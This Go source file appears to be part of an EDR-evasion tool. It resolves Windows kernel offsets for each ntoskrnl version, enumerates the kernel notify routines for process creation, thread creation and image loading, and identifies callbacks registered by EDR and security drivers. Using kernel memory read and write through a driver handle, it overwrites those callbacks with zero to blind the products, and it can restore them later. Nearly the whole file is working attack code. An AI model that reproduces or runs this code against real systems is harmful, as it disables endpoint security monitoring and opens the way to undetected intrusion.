package main

import (
	"encoding/csv"
	"fmt"
	"io"
	"math"
	"strconv"
	"strings"
	"syscall"
	"unsafe"

	"golang.org/x/sys/windows"
)

const (
	//NtoskrnlOffsetType
	CREATE_PROCESS_ROUTINE            = 0
	CREATE_THREAD_ROUTINE             = 1
	LOAD_IMAGE_ROUTINE                = 2
	PROTECTION_LEVEL                  = 3
	ETW_THREAT_INT_PROV_REG_HANDLE    = 4
	ETW_REG_ENTRY_GUIDENTRY           = 5
	ETW_GUID_ENTRY_PROVIDERENABLEINFO = 6
	_SUPPORTED_NTOSKRNL_OFFSETS_END   = 7
)

func getFileVersion(fName string) (string, error) {
	var zeroHandle windows.Handle
	var lpBuffer uintptr
	var size uint32
	zeroHandle = 0
	verSize, err := windows.GetFileVersionInfoSize(fName, &zeroHandle)
	if err != nil {
		return "", err
	}
	if verSize != 0 {
		data := make([]byte, verSize)
		err = windows.GetFileVersionInfo(fName, 0, verSize, unsafe.Pointer(&data[0]))
		if err != nil {
			return "", err
		}
		err = windows.VerQueryValue(unsafe.Pointer(&data[0]), "\\", unsafe.Pointer(&lpBuffer), &size)
		if err != nil {
			return "", err
		}
		if size != 0 {
			start := int(lpBuffer) - int(uintptr(unsafe.Pointer(&data[0])))
			end := start + int(size)
			if start < 0 || start >= len(data) || end < start || end > len(data) {
				fmt.Println("VerQueryValueRoot")
			}
			infoData := data[start:end]
			info := *((*windows.VS_FIXEDFILEINFO)(unsafe.Pointer(&infoData[0])))
			majorVersion := (info.FileVersionLS >> 16) & 0xffff
			minorVersion := (info.FileVersionLS >> 0) & 0xffff
			return fmt.Sprintf("%d-%d", majorVersion, minorVersion), nil
		}
	}
	return "", nil
}

func getNtoskrnlVersion() NtoskrnlOffsets {
	dir, err := windows.GetSystemDirectory()
	ntoskrnPath := dir + "\\ntoskrnl.exe"
	if err != nil {
		panic(err)
	}
	fmt.Println(ntoskrnPath)
	version, err := getFileVersion(ntoskrnPath)
	if err != nil {
		panic(err)
	}

	ntoskrnVersion := fmt.Sprintf("ntoskrnl_%s.exe", version)

	ntoskrnlOffsets := NtoskrnlOffsets{}
	r := csv.NewReader(strings.NewReader(ntoskrnlOffsetsCSV))
	for {
		row, err := r.Read()
		if err == io.EOF {
			ntoskrnlOffsets = NtoskrnlOffsets{"", 0, 0, 0, 0, 0, 0, 0}
			break
		}
		if row[0] == ntoskrnVersion {
			ntoskrnlVersion := row[0]
			pspCreateProcessNotifyRoutine, _ := strconv.ParseUint(row[1], 16, 64)
			pspCreateThreadNotifyRoutine, _ := strconv.ParseUint(row[2], 16, 64)
			pspLoadImageNotifyRoutine, _ := strconv.ParseUint(row[3], 16, 64)
			psProtection, _ := strconv.ParseUint(row[4], 16, 64)
			etwThreatIntProvRegHandle, _ := strconv.ParseUint(row[5], 16, 64)
			etwRegEntryGuidEntry, _ := strconv.ParseUint(row[6], 16, 64)
			etwGuidEntryProviderEnableInfo, _ := strconv.ParseUint(row[7], 16, 64)
			ntoskrnlOffsets = NtoskrnlOffsets{
				ntoskrnlVersion,
				pspCreateProcessNotifyRoutine,
				pspCreateThreadNotifyRoutine,
				pspLoadImageNotifyRoutine,
				psProtection,
				etwThreatIntProvRegHandle,
				etwRegEntryGuidEntry,
				etwGuidEntryProviderEnableInfo,
			}
			break
		}
	}
	return ntoskrnlOffsets
}

func findNtoskrnlBaseAddress() DWORD64 {
	cbNeeded := uint32(0)
	var drivers [1024]DWORD64
	sizeOfdrivers := uint32(unsafe.Sizeof(drivers))
	if EnumDeviceDrivers(uintptr(unsafe.Pointer(&drivers)), sizeOfdrivers, &cbNeeded) {
		return drivers[0]
	}
	//need error response
	return drivers[0]
}

func findDriver(adr DWORD64) (string, error) {
	cbNeeded := uint32(0)
	var drivers [1024]DWORD64
	var diff DWORD64
	minDiff := DWORD64(math.MaxUint64)
	sizeOfdrivers := uint32(unsafe.Sizeof(drivers))
	if EnumDeviceDrivers(uintptr(unsafe.Pointer(&drivers)), sizeOfdrivers, &cbNeeded) {
		cDrivers := int(cbNeeded / 8) //8 means sizeof(drivers[0])
		for i := 0; i < cDrivers; i++ {
			if drivers[i] <= adr {
				diff = adr - drivers[i]
				if diff < minDiff {
					minDiff = diff
				}
			}
		}
	} else {
		fmt.Printf("[!] Could not resolve driver for %x, an EDR driver might be missed\n", adr)
		return "", nil
	}
	var szDriver [1024]uint16
	_, err := GetDeviceDriverBaseNameW(uintptr(adr-minDiff), uintptr(unsafe.Pointer(&szDriver)), 1024)
	if err != nil {
		return "", err
	}
	driver := syscall.UTF16ToString(szDriver[:])
	fmt.Printf("[+] %x [%s + %x]\n", adr, driver, minDiff)
	return driver, nil
}

func operateNotifyRoutines(notifyRoutineAddress DWORD64, edrDrivers *FOUND_EDR_CALLBACKS, remove bool) {
	device := getDriverHandle()
	currentEDRDriversCount := 0
	maxCallbacks := 64
	for i := 0; i < maxCallbacks; i++ {
		callbackStruct := readMemoryDWORD64(device, notifyRoutineAddress+DWORD64(i*8)) //8 means sizeof(DWORD64)
		if callbackStruct != 0 {
			callback := (callbackStruct &^ 0b1111) + 8
			cbFunction := readMemoryDWORD64(device, callback)
			driver, err := findDriver(cbFunction)
			if err != nil {
				panic(err)
			}
			if driver != "" && isDriverEDR(driver) {
				callbackAddr := notifyRoutineAddress + DWORD64(i*8) //8 means sizeof(DWORD64)
				newFoundDriver := KRNL_CALLBACK{}
				newFoundDriver.driver = driver
				newFoundDriver.callbackAddr = uint64(callbackAddr)
				newFoundDriver.callbackStruct = uint64(callbackStruct)
				newFoundDriver.callbackFunc = uint64(cbFunction)

				if !remove {
					fmt.Printf("[+] Found EDR driver callback: '%s' [callback addr: %x | callback struct: %x | callback function: %x]\n", driver, callbackAddr, callbackStruct, cbFunction)
					newFoundDriver.removed = false
				} else {
					fmt.Printf("[+] Removing EDR driver callback: '%s' [callback addr: %x | callback struct: %x | callback function: %x]\n", driver, callbackAddr, callbackStruct, cbFunction)
					writeMemoryDWORD64(device, callbackAddr, 0x0000000000000000)
					newFoundDriver.removed = true
				}
				edrDrivers.EDR_CALLBACKS[int(edrDrivers.index)+currentEDRDriversCount] = newFoundDriver
				currentEDRDriversCount++
			}
		}

	}
	edrDrivers.index = edrDrivers.index + uint64(currentEDRDriversCount)
	if currentEDRDriversCount == 0 {
		fmt.Println("[+] No EDR driver(s) found!")
	} else if remove {
		fmt.Printf("[+] Removed a total of %d EDR / security products driver(s)\n", currentEDRDriversCount)
	} else {
		fmt.Printf("[+] Found a total of %d EDR / security products driver(s)\n", currentEDRDriversCount)
	}
	windows.CloseHandle(device)
}

func (nOffsets *NtoskrnlOffsets) toNtoskrnlOffsets(nrt int) DWORD64 {
	switch nrt {
	case CREATE_PROCESS_ROUTINE:
		return DWORD64(nOffsets.pspCreateProcessNotifyRoutine)
	case CREATE_THREAD_ROUTINE:
		return DWORD64(nOffsets.pspCreateThreadNotifyRoutine)
	case LOAD_IMAGE_ROUTINE:
		return DWORD64(nOffsets.pspLoadImageNotifyRoutine)
	case PROTECTION_LEVEL:
		return DWORD64(nOffsets.psProtection)
	case ETW_THREAT_INT_PROV_REG_HANDLE:
		return DWORD64(nOffsets.etwThreatIntProvRegHandle)
	case ETW_REG_ENTRY_GUIDENTRY:
		return DWORD64(nOffsets.etwRegEntryGuidEntry)
	case ETW_GUID_ENTRY_PROVIDERENABLEINFO:
		return DWORD64(nOffsets.etwGuidEntryProviderEnableInfo)
	}
	return 0
}
func getPspXNotifyRoutineAddress(nrt int, nOffsets *NtoskrnlOffsets) DWORD64 {
	ntoskrnlBaseAddress := findNtoskrnlBaseAddress()
	pspXNotifyRoutineOffset := nOffsets.toNtoskrnlOffsets(nrt)
	pspXNotifyRoutineAddress := ntoskrnlBaseAddress + pspXNotifyRoutineOffset
	return pspXNotifyRoutineAddress
}

func enumPspXNotifyRoutine(nrt int, edrDrivers *FOUND_EDR_CALLBACKS, nOffsets *NtoskrnlOffsets) {
	notifyRoutineTypeStrs := [3]string{"process creation", "thread creation", "image loading"}
	notifyRoutineTypeNames := [3]string{"ProcessCreate", "ThreadCreate", "LoadImage"}
	pspXNotifyRoutineAddress := getPspXNotifyRoutineAddress(nrt, nOffsets)
	fmt.Printf("[+] Enumerating %s callbacks\n", notifyRoutineTypeStrs[nrt])
	fmt.Printf("[+] Psp%sNotifyRoutine: %x\n", notifyRoutineTypeNames[nrt], pspXNotifyRoutineAddress)
	operateNotifyRoutines(pspXNotifyRoutineAddress, edrDrivers, false)
}

func removePspXNotifyRoutine(nrt int, edrDrivers *FOUND_EDR_CALLBACKS, nOffsets *NtoskrnlOffsets) {
	notifyRoutineTypeStrs := [3]string{"process creation", "thread creation", "image loading"}
	notifyRoutineTypeNames := [3]string{"ProcessCreate", "ThreadCreate", "LoadImage"}
	pspXNotifyRoutineAddress := getPspXNotifyRoutineAddress(nrt, nOffsets)
	fmt.Printf("[+] Removing %s callbacks\n", notifyRoutineTypeStrs[nrt])
	fmt.Printf("[+] Psp%sNotifyRoutine: %x\n", notifyRoutineTypeNames[nrt], pspXNotifyRoutineAddress)
	operateNotifyRoutines(pspXNotifyRoutineAddress, edrDrivers, true)
}

func enumAllEDRKernelCallbacks() {
	ntoskrnlOffsets := getNtoskrnlVersion()
	ntoskrnlVersion := ntoskrnlOffsets.ntoskrnlVersion
	if ntoskrnlVersion == "" {
		fmt.Printf("NtoskrnlVersion not found -> %s\n", ntoskrnlOffsets.ntoskrnlVersion)
		return
	}
	fmt.Printf("NtoskrnlVersion is %s\n", ntoskrnlOffsets.ntoskrnlVersion)
	var edrDrivers FOUND_EDR_CALLBACKS
	edrDrivers.index = 0
	enumPspXNotifyRoutine(CREATE_PROCESS_ROUTINE, &edrDrivers, &ntoskrnlOffsets)
	enumPspXNotifyRoutine(CREATE_THREAD_ROUTINE, &edrDrivers, &ntoskrnlOffsets)
	enumPspXNotifyRoutine(LOAD_IMAGE_ROUTINE, &edrDrivers, &ntoskrnlOffsets)
	println(edrDrivers.index)
}

func removeAllEDRKernelCallbacks() FOUND_EDR_CALLBACKS {
	ntoskrnlOffsets := getNtoskrnlVersion()
	ntoskrnlVersion := ntoskrnlOffsets.ntoskrnlVersion
	var edrDrivers FOUND_EDR_CALLBACKS
	edrDrivers.index = 0
	if ntoskrnlVersion == "" {
		fmt.Printf("NtoskrnlVersion not found -> %s\n", ntoskrnlOffsets.ntoskrnlVersion)
		return edrDrivers
	}
	fmt.Printf("NtoskrnlVersion is %s\n", ntoskrnlOffsets.ntoskrnlVersion)
	removePspXNotifyRoutine(CREATE_PROCESS_ROUTINE, &edrDrivers, &ntoskrnlOffsets)
	removePspXNotifyRoutine(CREATE_THREAD_ROUTINE, &edrDrivers, &ntoskrnlOffsets)
	removePspXNotifyRoutine(LOAD_IMAGE_ROUTINE, &edrDrivers, &ntoskrnlOffsets)
	println(edrDrivers.index)
	return edrDrivers
}

func restoreAllEDRKernelCallbacks(edrDrivers FOUND_EDR_CALLBACKS) {
	device := getDriverHandle()
	for i := 0; i < int(edrDrivers.index); i++ {
		if edrDrivers.EDR_CALLBACKS[i].removed == true {
			fmt.Printf("[+] Restoring callback of EDR driver '%s' [callback addr: %x | callback struct: %x | callback function: %x]\n",
				edrDrivers.EDR_CALLBACKS[i].driver,
				edrDrivers.EDR_CALLBACKS[i].callbackAddr,
				edrDrivers.EDR_CALLBACKS[i].callbackStruct,
				edrDrivers.EDR_CALLBACKS[i].callbackFunc)
			writeMemoryDWORD64(device, DWORD64(edrDrivers.EDR_CALLBACKS[i].callbackAddr), DWORD64(edrDrivers.EDR_CALLBACKS[i].callbackStruct))
		}
	}
}
